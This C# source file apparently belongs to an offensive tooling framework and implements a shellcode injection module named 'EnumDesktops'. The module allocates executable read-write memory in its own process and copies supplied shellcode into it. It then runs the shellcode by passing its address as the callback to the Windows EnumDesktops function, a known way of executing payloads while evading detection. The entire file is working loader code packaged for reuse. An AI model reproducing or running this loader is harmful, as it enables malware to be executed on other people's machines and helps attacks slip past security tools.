using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class EnumDesktopsInjection : IInjectionMethod
    {
        public string Name => "EnumDesktops";
        public string Description => "Self-injection via EnumDesktops callback";

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumDesktops(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetProcessWindowStation();

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                // Allocate memory for shellcode in current process
                IntPtr baseAddress = Win32.VirtualAllocEx(
                    (Win32.HANDLE)Win32.GetCurrentProcess(),
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode
                unsafe
                {
                    fixed (byte* pShellcode = shellcode)
                    {
                        nuint written = 0;
                        // Fixed: Cast GetCurrentProcess() result to Win32.HANDLE
                        Win32.BOOL writeResult = Win32.WriteProcessMemory(
                            (Win32.HANDLE)Win32.GetCurrentProcess(),
                            (void*)baseAddress,
                            pShellcode,
                            (nuint)shellcode.Length,
                            &written);

                        if (!writeResult)
                        {
                            DebugLogger.WriteLine($"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
                            return false;
                        }
                    }
                }

                DebugLogger.WriteLine("[+] Triggering execution via EnumDesktops...");

                // Get handle to current window station
                IntPtr hWinSta = GetProcessWindowStation();
                if (hWinSta == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] GetProcessWindowStation failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Execute shellcode by passing it as the callback function
                // The shellcode must handle the callback signature: BOOL CALLBACK EnumDesktopProc(LPTSTR lpszDesktop, LPARAM lParam)
                bool result = EnumDesktops(hWinSta, baseAddress, IntPtr.Zero);

                DebugLogger.WriteLine("[+] EnumDesktops returned");
                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] EnumDesktops injection failed: {ex.Message}");
                return false;
            }
        }
    }
}